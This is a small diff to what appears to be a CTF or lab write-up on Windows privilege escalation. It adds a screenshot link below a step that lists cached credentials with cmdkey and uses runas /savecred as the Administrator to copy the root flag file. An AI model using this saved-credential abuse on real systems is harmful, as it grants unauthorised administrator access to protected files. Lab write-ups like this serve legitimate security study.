@@ -288,6 +288,7 @@ cmdkey /list
 #we can use runas to get root flag
 C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\Desktop\root.txt"
 ```
+![image](https://github.com/user-attachments/assets/dcf817be-e1ba-4eee-843d-b9b1af13081d)
 
 ## Registry
 
